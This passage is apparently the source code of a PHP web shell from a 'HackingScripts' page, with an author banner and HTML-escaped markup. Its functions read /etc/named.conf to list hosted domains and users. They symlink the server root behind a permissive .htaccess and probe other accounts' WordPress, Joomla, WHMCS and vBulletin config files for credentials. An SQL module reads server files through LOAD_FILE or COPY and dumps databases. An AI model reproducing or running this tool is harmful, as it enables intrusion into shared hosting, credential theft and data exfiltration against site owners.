<span class="x">    / Waqar.Khan  \    /        \     /&#39;-___-&#39;\    /    &lt;img src=&quot;/HackingScripts/wp-includes/images/smilies/icon_neutral.gif&quot; alt=&quot;:|&quot; class=&quot;wp-smiley&quot; /&gt;    \</span>
<span class="x">    (_)     .     (_)  /  Ikram   \   / M-Usman \  (_)   &lt;img src=&quot;/HackingScripts/wp-includes/images/smilies/icon_neutral.gif&quot; alt=&quot;:|&quot; class=&quot;wp-smiley&quot; /&gt;   (_)</span>
<span class="x">    \_-----&#39;____--/  (_)  Ali   (_) (_)_______(_)   |___:|____|</span>
<span class="x">     \___________/     |________|     \_______/     | Afrasiab|</span>





<span class="x">       &amp;lt;/pre&amp;gt;&amp;lt;/div&amp;gt;&quot;;</span>
<span class="x">        madfooter();</span>

<span class="x">        }</span>

<span class="x">    function madsymlink()</span>
<span class="x">    {</span>
<span class="x">        madhead();</span>

<span class="x">    $IIIIIIIIIIIl = &#39;http://&#39;.$_SERVER[&#39;SERVER_NAME&#39;].$_SERVER[&#39;REQUEST_URI&#39;];</span>
<span class="x">    $IIIIIIIIIII1=explode(&#39;/&#39;,$IIIIIIIIIIIl );</span>
<span class="x">    $IIIIIIIIIIIl =str_replace($IIIIIIIIIII1[count($IIIIIIIIIII1)-1],&#39;&#39;,$IIIIIIIIIIIl );  </span>




<span class="x">       echo &#39;&amp;lt;div class=header&amp;gt;&amp;lt;script&amp;gt;p1_=p2_=p3_=&quot;&quot;;&amp;lt;/script&amp;gt;&amp;lt;br&amp;gt;&amp;lt;center&amp;gt;&amp;lt;h3&amp;gt;&amp;lt;a href=# onclick=&quot;g(\&#39;symlink\&#39;,null,\&#39;website\&#39;,null)&quot;&amp;gt;| Domains | &amp;lt;/a&amp;gt;&amp;lt;a href=# onclick=&quot;g(\&#39;symlink\&#39;,null,null,\&#39;whole\&#39;)&quot;&amp;gt;| Whole Server Symlink | &amp;lt;/a&amp;gt;&amp;lt;a href=# onclick=&quot;g(\&#39;symlink\&#39;,null,null,null,\&#39;config\&#39;)&quot;&amp;gt;| Config PHP symlink | &amp;lt;/a&amp;gt;&amp;lt;/h3&amp;gt;&amp;lt;/center&amp;gt;&#39;;</span>

<span class="x">        if(isset($_POST[&#39;p1&#39;]) &amp;&amp; $_POST[&#39;p1&#39;]==&#39;website&#39;)</span>
<span class="x">        {</span>
<span class="x">            echo &quot;&amp;lt;center&amp;gt;&quot;;</span>
<span class="x">            $d0mains = @file(&quot;/etc/named.conf&quot;);</span>
<span class="x">            if(!$d0mains){ echo &quot;&amp;lt;pre class=ml1 style=&#39;margin-top:5px&#39;&amp;gt;Cant access this file on server -&amp;gt; [ /etc/named.conf ]&amp;lt;/pre&amp;gt;&amp;lt;/center&amp;gt;&quot;; }</span>



<span class="x">    echo &quot;&amp;lt;table align=center class=&#39;main&#39;  border=0  &amp;gt;</span>

<span class="x">    &amp;lt;tr bgcolor=Red&amp;gt;&amp;lt;td&amp;gt;Count&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;domains&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;users&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;;</span>
<span class="x">    $count=1;</span>
<span class="x">    foreach($d0mains as $d0main){</span>

<span class="x">    if(@eregi(&quot;zone&quot;,$d0main)){</span>

<span class="x">    preg_match_all(&#39;#zone &quot;(.*)&quot;#&#39;, $d0main, $domains);</span>

<span class="x">    flush();</span>

<span class="x">    if(strlen(trim($domains[1][0])) &amp;gt; 2){</span>

<span class="x">    $user = posix_getpwuid(@fileowner(&quot;/etc/valiases/&quot;.$domains[1][0]));</span>

<span class="x">    echo &quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&quot;.$count.&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=http://www.&quot;.$domains[1][0].&quot;/&amp;gt;&quot;.$domains[1][0].&quot;&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;.$user[&#39;name&#39;].&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;; flush();</span>
<span class="x">    $count++;</span>
<span class="x">    }}}</span>
<span class="x">    echo &quot;&amp;lt;/center&amp;gt;&amp;lt;/table&amp;gt;&quot;;</span>
<span class="x">     }</span>

<span class="x">     if(isset($_POST[&#39;p2&#39;]) &amp;&amp; $_POST[&#39;p2&#39;]==&#39;whole&#39;)</span>
<span class="x">     {</span>


<span class="x">        @set_time_limit(0);</span>

<span class="x">        echo &quot;&amp;lt;center&amp;gt;&quot;;</span>



<span class="x">    @mkdir(&#39;sym&#39;,0777);</span>
<span class="x">    $IIIIIIIIIIl1  = &quot;Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any&quot;;</span>
<span class="x">    $IIIIIIIIII1I =@fopen (&#39;sym/.htaccess&#39;,&#39;w&#39;);</span>
<span class="x">    fwrite($IIIIIIIIII1I ,$IIIIIIIIIIl1);</span>
<span class="x">    @symlink(&#39;/&#39;,&#39;sym/root&#39;);</span>
<span class="x">    $IIIIIIIIIlIl = basename(&#39;_FILE_&#39;);</span>


<span class="x">    $IIIIIIIIIllI = @file(&#39;/etc/named.conf&#39;);</span>
<span class="x">    if(!$IIIIIIIIIllI)</span>
<span class="x">    {</span>
<span class="x">    echo &quot;&amp;lt;pre class=ml1 style=&#39;margin-top:5px&#39;&amp;gt;# Cant access this file on server -&amp;gt; [ /etc/named.conf ]&amp;lt;/pre&amp;gt;&amp;lt;/center&amp;gt;&quot;;</span>
<span class="x">    }</span>
<span class="x">    else</span>
<span class="x">    {</span>
<span class="x">    echo &quot;&amp;lt;table align=&#39;center&#39; width=&#39;40%&#39; class=&#39;main&#39;&amp;gt;&amp;lt;td&amp;gt;Domains&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;Users&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;symlink &amp;lt;/td&amp;gt;&quot;;</span>
<span class="x">    foreach($IIIIIIIIIllI as $IIIIIIIIIll1){</span>
<span class="x">    if(@eregi(&#39;zone&#39;,$IIIIIIIIIll1)){</span>
<span class="x">    preg_match_all(&#39;#zone &quot;(.*)&quot;#&#39;,$IIIIIIIIIll1,$IIIIIIIIIl11);</span>
<span class="x">    flush();</span>
<span class="x">    if(strlen(trim($IIIIIIIIIl11[1][0])) &amp;gt;2){</span>
<span class="x">    $IIIIIIIII1I1 = posix_getpwuid(@fileowner(&#39;/etc/valiases/&#39;.$IIIIIIIIIl11[1][0]));</span>
<span class="x">    $IIIIIIII1I1l = $IIIIIIIII1I1[&#39;name&#39;] ;</span>
<span class="x">    @symlink(&#39;/&#39;,&#39;sym/root&#39;);</span>
<span class="x">    $IIIIIIII1I1l = $IIIIIIIIIl11[1][0];</span>
<span class="x">    $IIIIIIII1I11 = &#39;\.ir&#39;;</span>
<span class="x">    $IIIIIIII1lII = &#39;\.il&#39;;</span>
<span class="x">    if (@eregi(&quot;$IIIIIIII1I11&quot;,$IIIIIIIIIl11[1][0]) or @eregi(&quot;$IIIIIIII1lII&quot;,$IIIIIIIIIl11[1][0]) )</span>
<span class="x">    {</span>
<span class="x">    $IIIIIIII1I1l = &quot;&amp;lt;div style=&#39; color: #FF0000 ; text-shadow: 0px 0px 1px red; &#39;&amp;gt;&quot;.$IIIIIIIIIl11[1][0].&#39;&amp;lt;/div&amp;gt;&#39;;</span>
<span class="x">    }</span>
<span class="x">    echo &quot;</span>
<span class="x">    &amp;lt;tr&amp;gt;</span>

<span class="x">    &amp;lt;td&amp;gt;</span>
<span class="x">    &amp;lt;a target=&#39;_blank&#39; href=http://www.&quot;.$IIIIIIIIIl11[1][0].&#39;/&amp;gt;&#39;.$IIIIIIII1I1l.&#39; &amp;lt;/a&amp;gt;</span>
<span class="x">    &amp;lt;/td&amp;gt;</span>

<span class="x">    &amp;lt;td&amp;gt;</span>
<span class="x">    &#39;.$IIIIIIIII1I1[&#39;name&#39;].&quot;</span>
<span class="x">    &amp;lt;/td&amp;gt;</span>

<span class="x">    &amp;lt;td&amp;gt;</span>
<span class="x">    &amp;lt;a href=&#39;sym/root/home/&quot;.$IIIIIIIII1I1[&#39;name&#39;].&quot;/public_html&#39; target=&#39;_blank&#39;&amp;gt;symlink &amp;lt;/a&amp;gt;</span>
<span class="x">    &amp;lt;/td&amp;gt;</span>


<span class="x">    &amp;lt;/tr&amp;gt;&quot;;</span>
<span class="x">    flush();</span>
<span class="x">    }</span>
<span class="x">    }</span>
<span class="x">    }</span>
<span class="x">    }</span>

<span class="x">    echo &quot;&amp;lt;/center&amp;gt;&amp;lt;/table&amp;gt;&quot;;</span>

<span class="x">     }</span>



<span class="x">     if(isset($_POST[&#39;p3&#39;]) &amp;&amp; $_POST[&#39;p3&#39;]==&#39;config&#39;)</span>


<span class="x">     {</span>
<span class="x">      echo &quot;&amp;lt;center&amp;gt;&quot;;</span>
<span class="x">    @mkdir(&#39;sym&#39;,0777);</span>
<span class="x">    $IIIIIIIIIIl1  = &quot;Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any&quot;;</span>
<span class="x">    $IIIIIIIIII1I =@fopen (&#39;sym/.htaccess&#39;,&#39;w&#39;);</span>
<span class="x">    @fwrite($IIIIIIIIII1I ,$IIIIIIIIIIl1);</span>
<span class="x">    @symlink(&#39;/&#39;,&#39;sym/root&#39;);</span>
<span class="x">    $IIIIIIIIIlIl = basename(&#39;_FILE_&#39;);</span>


<span class="x">       $IIIIIIIIIllI = @file(&#39;/etc/named.conf&#39;);</span>
<span class="x">    if(!$IIIIIIIIIllI)</span>
<span class="x">    {</span>
<span class="x">    echo &quot;&amp;lt;pre class=ml1 style=&#39;margin-top:5px&#39;&amp;gt;# Cant access this file on server -&amp;gt; [ /etc/named.conf ]&amp;lt;/pre&amp;gt;&amp;lt;/center&amp;gt;&quot;;</span>
<span class="x">    }</span>
<span class="x">    else</span>
<span class="x">    {</span>
<span class="x">    echo &quot;</span>
<span class="x">    &amp;lt;table align=&#39;center&#39; width=&#39;40%&#39; class=&#39;main&#39; &amp;gt;&amp;lt;td&amp;gt; Domains &amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; Script &amp;lt;/td&amp;gt;&quot;;</span>
<span class="x">    foreach($IIIIIIIIIllI as $IIIIIIIIIll1){</span>
<span class="x">    if(@eregi(&#39;zone&#39;,$IIIIIIIIIll1)){</span>
<span class="x">    preg_match_all(&#39;#zone &quot;(.*)&quot;#&#39;,$IIIIIIIIIll1,$IIIIIIIIIl11);</span>
<span class="x">    flush();</span>
<span class="x">    if(strlen(trim($IIIIIIIIIl11[1][0])) &amp;gt;2){</span>
<span class="x">    $IIIIIIIII1I1 = posix_getpwuid(@fileowner(&#39;/etc/valiases/&#39;.$IIIIIIIIIl11[1][0]));</span>
<span class="x">    $IIIIIIIII1l1=$IIIIIIIIIIIl.&#39;/sym/root/home/&#39;.$IIIIIIIII1I1[&#39;name&#39;].&#39;/public_html/wp-config.php&#39;;</span>
<span class="x">    $IIIIIIIII11I=get_headers($IIIIIIIII1l1);</span>
<span class="x">    $IIIIIIIII11l=$IIIIIIIII11I[0];</span>
<span class="x">    $IIIIIIIII111=$IIIIIIIIIIIl.&#39;/sym/root/home/&#39;.$IIIIIIIII1I1[&#39;name&#39;].&#39;/public_html/blog/wp-config.php&#39;;</span>
<span class="x">    $IIIIIIIIlIII=get_headers($IIIIIIIII111);</span>
<span class="x">    $IIIIIIIIlIIl=$IIIIIIIIlIII[0];</span>
<span class="x">    $IIIIIIIIlII1=$IIIIIIIIIIIl.&#39;/sym/root/home/&#39;.$IIIIIIIII1I1[&#39;name&#39;].&#39;/public_html/configuration.php&#39;;</span>
<span class="x">    $IIIIIIIIlIlI=get_headers($IIIIIIIIlII1);</span>
<span class="x">    $IIIIIIIIlIll=$IIIIIIIIlIlI[0];</span>
<span class="x">    $IIIIIIIIlIl1=$IIIIIIIIIIIl.&#39;/sym/root/home/&#39;.$IIIIIIIII1I1[&#39;name&#39;].&#39;/public_html/joomla/configuration.php&#39;;</span>
<span class="x">    $IIIIIIIIlI1I=get_headers($IIIIIIIIlIl1);</span>
<span class="x">    $IIIIIIIIlI1l=$IIIIIIIIlI1I[0];</span>
<span class="x">    $IIIIIIIIlI11=$IIIIIIIIIIIl.&#39;/sym/root/home/&#39;.$IIIIIIIII1I1[&#39;name&#39;].&#39;/public_html/includes/config.php&#39;;</span>
<span class="x">    $IIIIIIIIllII=get_headers($IIIIIIIIlI11);</span>
<span class="x">    $IIIIIIIIllIl=$IIIIIIIIllII[0];</span>
<span class="x">    $IIIIIIIIllI1=$IIIIIIIIIIIl.&#39;/sym/root/home/&#39;.$IIIIIIIII1I1[&#39;name&#39;].&#39;/public_html/vb/includes/config.php&#39;;</span>
<span class="x">    $IIIIIIIIlllI=get_headers($IIIIIIIIllI1);</span>
<span class="x">    $IIIIIIIIllll=$IIIIIIIIlllI[0];</span>
<span class="x">    $IIIIIIIIlll1=$IIIIIIIIIIIl.&#39;/sym/root/home/&#39;.$IIIIIIIII1I1[&#39;name&#39;].&#39;/public_html/forum/includes/config.php&#39;;</span>
<span class="x">    $IIIIIIIIll1I=get_headers($IIIIIIIIlll1);</span>
<span class="x">    $IIIIIIIIll1l=$IIIIIIIIll1I[0];</span>
<span class="x">    $IIIIIIIIll11=$IIIIIIIIIIIl.&#39;/sym/root/home/&#39;.$IIIIIIIII1I1[&#39;name&#39;].&#39;public_html/clients/configuration.php&#39;;</span>
<span class="x">    $IIIIIIIIl1II=get_headers($IIIIIIIIll11);</span>
<span class="x">    $IIIIIIIIl1Il=$IIIIIIIIl1II[0];</span>
<span class="x">    $IIIIIIIIl1I1=$IIIIIIIIIIIl.&#39;/sym/root/home/&#39;.$IIIIIIIII1I1[&#39;name&#39;].&#39;/public_html/support/configuration.php&#39;;</span>
<span class="x">    $IIIIIIIIl1II=get_headers($IIIIIIIIl1I1);</span>
<span class="x">    $IIIIIIIIl1lI=$IIIIIIIIl1II[0];</span>
<span class="x">    $IIIIIIIIl1ll=$IIIIIIIIIIIl.&#39;/sym/root/home/&#39;.$IIIIIIIII1I1[&#39;name&#39;].&#39;/public_html/client/configuration.php&#39;;</span>
<span class="x">    $IIIIIIIIl1l1=get_headers($IIIIIIIIl1ll);</span>
<span class="x">    $IIIIIIIIl11I=$IIIIIIIIl1l1[0];</span>
<span class="x">    $IIIIIIIIl11l=$IIIIIIIIIIIl.&#39;/sym/root/home/&#39;.$IIIIIIIII1I1[&#39;name&#39;].&#39;/public_html/submitticket.php&#39;;</span>
<span class="x">    $IIIIIIIIl111=get_headers($IIIIIIIIl11l);</span>
<span class="x">    $IIIIIIII1III=$IIIIIIIIl111[0];</span>
<span class="x">    $IIIIIIII1IIl=$IIIIIIIIIIIl.&#39;/sym/root/home/&#39;.$IIIIIIIII1I1[&#39;name&#39;].&#39;/public_html/client/configuration.php&#39;;</span>
<span class="x">    $IIIIIIII1II1=get_headers($IIIIIIII1IIl);</span>
<span class="x">    $IIIIIIII1IlI=$IIIIIIII1II1[0];</span>
<span class="x">    $IIIIIIII1Ill = strpos($IIIIIIIII11l,&#39;200&#39;);</span>
<span class="x">    $IIIIIIII1I1I=&#39;&amp;nbsp;&#39;;</span>
<span class="x">    if (strpos($IIIIIIIII11l,&#39;200&#39;) == true )</span>
<span class="x">    {</span>
<span class="x">    $IIIIIIII1I1I=&quot;&amp;lt;a href=&#39;&quot;.$IIIIIIIII1l1.&quot;&#39; target=&#39;_blank&#39;&amp;gt;Wordpress&amp;lt;/a&amp;gt;&quot;;</span>
<span class="x">    }</span>
<span class="x">    elseif (strpos($IIIIIIIIlIIl,&#39;200&#39;) == true)</span>
<span class="x">    {</span>
<span class="x">    $IIIIIIII1I1I=&quot;&amp;lt;a href=&#39;&quot;.$IIIIIIIII111.&quot;&#39; target=&#39;_blank&#39;&amp;gt;Wordpress&amp;lt;/a&amp;gt;&quot;;</span>
<span class="x">    }</span>
<span class="x">    elseif (strpos($IIIIIIIIlIll,&#39;200&#39;)  == true and strpos($IIIIIIII1III,&#39;200&#39;)  == true )</span>
<span class="x">    {</span>
<span class="x">    $IIIIIIII1I1I=&quot; &amp;lt;a href=&#39;&quot;.$IIIIIIIIl11l.&quot;&#39; target=&#39;_blank&#39;&amp;gt;WHMCS&amp;lt;/a&amp;gt;&quot;;</span>
<span class="x">    }</span>
<span class="x">    elseif (strpos($IIIIIIIIl1lI,&#39;200&#39;)  == true)</span>
<span class="x">    {</span>
<span class="x">    $IIIIIIII1I1I =&quot; &amp;lt;a href=&#39;&quot;.$IIIIIIIIl1I1.&quot;&#39; target=&#39;_blank&#39;&amp;gt;WHMCS&amp;lt;/a&amp;gt;&quot;;</span>
<span class="x">    }</span>
<span class="x">    elseif (strpos($IIIIIIIIl11I,&#39;200&#39;)  == true)</span>
<span class="x">    {</span>
<span class="x">    $IIIIIIII1I1I =&quot; &amp;lt;a href=&#39;&quot;.$IIIIIIIIl1ll.&quot;&#39; target=&#39;_blank&#39;&amp;gt;WHMCS&amp;lt;/a&amp;gt;&quot;;</span>
<span class="x">    }</span>
<span class="x">    elseif (strpos($IIIIIIIIlIll,&#39;200&#39;)  == true)</span>
<span class="x">    {</span>
<span class="x">    $IIIIIIII1I1I=&quot; &amp;lt;a href=&#39;&quot;.$IIIIIIIIlII1.&quot;&#39; target=&#39;_blank&#39;&amp;gt;Joomla&amp;lt;/a&amp;gt;&quot;;</span>
<span class="x">    }</span>
<span class="x">    elseif (strpos($IIIIIIIIlI1l,&#39;200&#39;)  == true)</span>
<span class="x">    {</span>
<span class="x">    $IIIIIIII1I1I=&quot; &amp;lt;a href=&#39;&quot;.$IIIIIIIIlIl1.&quot;&#39; target=&#39;_blank&#39;&amp;gt;Joomla&amp;lt;/a&amp;gt;&quot;;</span>
<span class="x">    }</span>
<span class="x">    elseif (strpos($IIIIIIIIllIl,&#39;200&#39;)  == true)</span>
<span class="x">    {</span>
<span class="x">    $IIIIIIII1I1I=&quot; &amp;lt;a href=&#39;&quot;.$IIIIIIIIlI11.&quot;&#39; target=&#39;_blank&#39;&amp;gt;vBulletin&amp;lt;/a&amp;gt;&quot;;</span>
<span class="x">    }</span>
<span class="x">    elseif (strpos($IIIIIIIIllll,&#39;200&#39;)  == true)</span>
<span class="x">    {</span>
<span class="x">    $IIIIIIII1I1I=&quot; &amp;lt;a href=&#39;&quot;.$IIIIIIIIllI1.&quot;&#39; target=&#39;_blank&#39;&amp;gt;vBulletin&amp;lt;/a&amp;gt;&quot;;</span>
<span class="x">    }</span>
<span class="x">    elseif (strpos($IIIIIIIIll1l,&#39;200&#39;)  == true)</span>
<span class="x">    {</span>
<span class="x">    $IIIIIIII1I1I=&quot; &amp;lt;a href=&#39;&quot;.$IIIIIIIIlll1.&quot;&#39; target=&#39;_blank&#39;&amp;gt;vBulletin&amp;lt;/a&amp;gt;&quot;;</span>
<span class="x">    }</span>
<span class="x">    else</span>
<span class="x">    {</span>
<span class="x">    continue;</span>
<span class="x">    }</span>
<span class="x">    $IIIIIIII1I1l = $IIIIIIIII1I1[&#39;name&#39;] ;</span>
<span class="x">    echo &#39;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=http://www.&#39;.$IIIIIIIIIl11[1][0].&#39;/&amp;gt;&#39;.$IIIIIIIIIl11[1][0].&#39;&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">    &amp;lt;td&amp;gt;&#39;.$IIIIIIII1I1I.&#39;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&#39;;flush();</span>
<span class="x">    }</span>
<span class="x">    }</span>
<span class="x">    }</span>
<span class="x">    }</span>
<span class="x">    echo &quot;&amp;lt;/center&amp;gt;&amp;lt;/table&amp;gt;&quot;;  </span>

<span class="x">     }</span>

<span class="x">        echo &quot;&amp;lt;/div&amp;gt;&quot;;</span>
<span class="x">        madfooter();</span>

<span class="x">    }</span>


<span class="x">    function madsql()</span>
<span class="x">    {</span>


<span class="x">        class DbClass {</span>
<span class="x">                    var $type;</span>
<span class="x">                    var $link;</span>
<span class="x">                    var $res;</span>
<span class="x">                    function DbClass($type) {</span>
<span class="x">                            $this-&amp;gt;type = $type;</span>
<span class="x">                    }</span>
<span class="x">                    function connect($host, $user, $pass, $dbname){</span>
<span class="x">                            switch($this-&amp;gt;type)     {</span>
<span class="x">                                    case &#39;mysql&#39;:</span>
<span class="x">                                            if( $this-&amp;gt;link = @mysql_connect($host,$user,$pass,true) ) return true;</span>
<span class="x">                                            break;</span>
<span class="x">                                    case &#39;pgsql&#39;:</span>
<span class="x">                                            $host = explode(&#39;:&#39;, $host);</span>
<span class="x">                                            if(!$host[1]) $host[1]=5432;</span>
<span class="x">                                            if( $this-&amp;gt;link = @pg_connect(&quot;host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname&quot;) ) return true;</span>
<span class="x">                                            break;</span>
<span class="x">                            }</span>
<span class="x">                            return false;</span>
<span class="x">                    }</span>
<span class="x">                    function selectdb($db) {</span>
<span class="x">                            switch($this-&amp;gt;type)     {</span>
<span class="x">                                    case &#39;mysql&#39;:</span>
<span class="x">                                            if (@mysql_select_db($db))return true;</span>
<span class="x">                                            break;</span>
<span class="x">                            }</span>
<span class="x">                            return false;</span>
<span class="x">                    }</span>
<span class="x">                    function query($str) {</span>
<span class="x">                            switch($this-&amp;gt;type) {</span>
<span class="x">                                    case &#39;mysql&#39;:</span>
<span class="x">                                            return $this-&amp;gt;res = @mysql_query($str);</span>
<span class="x">                                            break;</span>
<span class="x">                                    case &#39;pgsql&#39;:</span>
<span class="x">                                            return $this-&amp;gt;res = @pg_query($this-&amp;gt;link,$str);</span>
<span class="x">                                            break;</span>
<span class="x">                            }</span>
<span class="x">                            return false;</span>
<span class="x">                    }</span>
<span class="x">                    function fetch() {</span>
<span class="x">                            $res = func_num_args()?func_get_arg(0):$this-&amp;gt;res;</span>
<span class="x">                            switch($this-&amp;gt;type)     {</span>
<span class="x">                                    case &#39;mysql&#39;:</span>
<span class="x">                                            return @mysql_fetch_assoc($res);</span>
<span class="x">                                            break;</span>
<span class="x">                                    case &#39;pgsql&#39;:</span>
<span class="x">                                            return @pg_fetch_assoc($res);</span>
<span class="x">                                            break;</span>
<span class="x">                            }</span>
<span class="x">                            return false;</span>
<span class="x">                    }</span>
<span class="x">                    function listDbs() {</span>
<span class="x">                            switch($this-&amp;gt;type)     {</span>
<span class="x">                                    case &#39;mysql&#39;:</span>
<span class="x">                            return $this-&amp;gt;query(&quot;SHOW databases&quot;);</span>
<span class="x">                                    break;</span>
<span class="x">                                    case &#39;pgsql&#39;:</span>
<span class="x">                                            return $this-&amp;gt;res = $this-&amp;gt;query(&quot;SELECT datname FROM pg_database WHERE datistemplate!=&#39;t&#39;&quot;);</span>
<span class="x">                                    break;</span>
<span class="x">                            }</span>
<span class="x">                            return false;</span>
<span class="x">                    }</span>
<span class="x">                    function listTables() {</span>
<span class="x">                            switch($this-&amp;gt;type)     {</span>
<span class="x">                                    case &#39;mysql&#39;:</span>
<span class="x">                                            return $this-&amp;gt;res = $this-&amp;gt;query(&#39;SHOW TABLES&#39;);</span>
<span class="x">                                    break;</span>
<span class="x">                                    case &#39;pgsql&#39;:</span>
<span class="x">                                            return $this-&amp;gt;res = $this-&amp;gt;query(&quot;select table_name from information_schema.tables where table_schema != &#39;information_schema&#39; AND table_schema != &#39;pg_catalog&#39;&quot;);</span>
<span class="x">                                    break;</span>
<span class="x">                            }</span>
<span class="x">                            return false;</span>
<span class="x">                    }</span>
<span class="x">                    function error() {</span>
<span class="x">                            switch($this-&amp;gt;type)     {</span>
<span class="x">                                    case &#39;mysql&#39;:</span>
<span class="x">                                            return @mysql_error();</span>
<span class="x">                                    break;</span>
<span class="x">                                    case &#39;pgsql&#39;:</span>
<span class="x">                                            return @pg_last_error();</span>
<span class="x">                                    break;</span>
<span class="x">                            }</span>
<span class="x">                            return false;</span>
<span class="x">                    }</span>
<span class="x">                    function setCharset($str) {</span>
<span class="x">                            switch($this-&amp;gt;type)     {</span>
<span class="x">                                    case &#39;mysql&#39;:</span>
<span class="x">                                            if(function_exists(&#39;mysql_set_charset&#39;))</span>
<span class="x">                                                    return @mysql_set_charset($str, $this-&amp;gt;link);</span>
<span class="x">                                            else</span>
<span class="x">                                                    $this-&amp;gt;query(&#39;SET CHARSET &#39;.$str);</span>
<span class="x">                                            break;</span>
<span class="x">                                    case &#39;pgsql&#39;:</span>
<span class="x">                                            return @pg_set_client_encoding($this-&amp;gt;link, $str);</span>
<span class="x">                                            break;</span>
<span class="x">                            }</span>
<span class="x">                            return false;</span>
<span class="x">                    }</span>
<span class="x">                    function loadFile($str) {</span>
<span class="x">                            switch($this-&amp;gt;type)     {</span>
<span class="x">                                    case &#39;mysql&#39;:</span>
<span class="x">                                            return $this-&amp;gt;fetch($this-&amp;gt;query(&quot;SELECT LOAD_FILE(&#39;&quot;.addslashes($str).&quot;&#39;) as file&quot;));</span>
<span class="x">                                    break;</span>
<span class="x">                                    case &#39;pgsql&#39;:</span>
<span class="x">                                            $this-&amp;gt;query(&quot;CREATE TABLE wso2(file text);COPY wso2 FROM &#39;&quot;.addslashes($str).&quot;&#39;;select file from wso2;&quot;);</span>
<span class="x">                                            $r=array();</span>
<span class="x">                                            while($i=$this-&amp;gt;fetch())</span>
<span class="x">                                                    $r[] = $i[&#39;file&#39;];</span>
<span class="x">                                            $this-&amp;gt;query(&#39;drop table wso2&#39;);</span>
<span class="x">                                            return array(&#39;file&#39;=&amp;gt;implode(&quot;\n&quot;,$r));</span>
<span class="x">                                    break;</span>
<span class="x">                            }</span>
<span class="x">                            return false;</span>
<span class="x">                    }</span>
<span class="x">                    function dump($table, $fp = false) {</span>
<span class="x">                            switch($this-&amp;gt;type)     {</span>
<span class="x">                                    case &#39;mysql&#39;:</span>
<span class="x">                                            $res = $this-&amp;gt;query(&#39;SHOW CREATE TABLE `&#39;.$table.&#39;`&#39;);</span>
<span class="x">                                            $create = mysql_fetch_array($res);</span>
<span class="x">                                            $sql = $create[1].&quot;;\n&quot;;</span>
<span class="x">                        if($fp) fwrite($fp, $sql); else echo($sql);</span>
<span class="x">                                            $this-&amp;gt;query(&#39;SELECT * FROM `&#39;.$table.&#39;`&#39;);</span>
<span class="x">                        $head = true;</span>
<span class="x">                                            while($item = $this-&amp;gt;fetch()) {</span>
<span class="x">                                                    $columns = array();</span>
<span class="x">                                                    foreach($item as $k=&amp;gt;$v) {</span>
<span class="x">                                if($v == null)</span>
<span class="x">                                    $item[$k] = &quot;NULL&quot;;</span>
<span class="x">                                elseif(is_numeric($v))</span>
<span class="x">                                    $item[$k] = $v;</span>
<span class="x">                                else</span>
<span class="x">                                    $item[$k] = &quot;&#39;&quot;.@mysql_real_escape_string($v).&quot;&#39;&quot;;</span>
<span class="x">                                                            $columns[] = &quot;`&quot;.$k.&quot;`&quot;;</span>
<span class="x">                                                    }</span>
<span class="x">                            if($head) {</span>
<span class="x">                                $sql = &#39;INSERT INTO `&#39;.$table.&#39;` (&#39;.implode(&quot;, &quot;, $columns).&quot;) VALUES \n\t(&quot;.implode(&quot;, &quot;, $item).&#39;)&#39;;</span>
<span class="x">                                $head = false;</span>
<span class="x">                            } else</span>
<span class="x">                                $sql = &quot;\n\t,(&quot;.implode(&quot;, &quot;, $item).&#39;)&#39;;</span>
<span class="x">                            if($fp) fwrite($fp, $sql); else echo($sql);</span>
<span class="x">                                            }</span>
<span class="x">                        if(!$head)</span>
<span class="x">                            if($fp) fwrite($fp, &quot;;\n\n&quot;); else echo(&quot;;\n\n&quot;);</span>
<span class="x">                                    break;</span>
<span class="x">                                    case &#39;pgsql&#39;:</span>
<span class="x">                                            $this-&amp;gt;query(&#39;SELECT * FROM &#39;.$table);</span>
<span class="x">                                            while($item = $this-&amp;gt;fetch()) {</span>
<span class="x">                                                    $columns = array();</span>
<span class="x">                                                    foreach($item as $k=&amp;gt;$v) {</span>
<span class="x">                                                            $item[$k] = &quot;&#39;&quot;.addslashes($v).&quot;&#39;&quot;;</span>
<span class="x">                                                            $columns[] = $k;</span>
<span class="x">                                                    }</span>
<span class="x">                            $sql = &#39;INSERT INTO &#39;.$table.&#39; (&#39;.implode(&quot;, &quot;, $columns).&#39;) VALUES (&#39;.implode(&quot;, &quot;, $item).&#39;);&#39;.&quot;\n&quot;;</span>
<span class="x">                            if($fp) fwrite($fp, $sql); else echo($sql);</span>
<span class="x">                                            }</span>
<span class="x">                                    break;</span>
<span class="x">                            }</span>
<span class="x">                            return false;</span>
<span class="x">                    }</span>
<span class="x">            };</span>
<span class="x">            $db = new DbClass($_POST[&#39;type&#39;]);</span>
<span class="x">            if(@$_POST[&#39;p2&#39;]==&#39;download&#39;) {</span>
<span class="x">                    $db-&amp;gt;connect($_POST[&#39;sql_host&#39;], $_POST[&#39;sql_login&#39;], $_POST[&#39;sql_pass&#39;], $_POST[&#39;sql_base&#39;]);</span>
<span class="x">                    $db-&amp;gt;selectdb($_POST[&#39;sql_base&#39;]);</span>
<span class="x">            switch($_POST[&#39;charset&#39;]) {</span>
<span class="x">                case &quot;Windows-1251&quot;: $db-&amp;gt;setCharset(&#39;cp1251&#39;); break;</span>
<span class="x">                case &quot;UTF-8&quot;: $db-&amp;gt;setCharset(&#39;utf8&#39;); break;</span>
<span class="x">                case &quot;KOI8-R&quot;: $db-&amp;gt;setCharset(&#39;koi8r&#39;); break;</span>
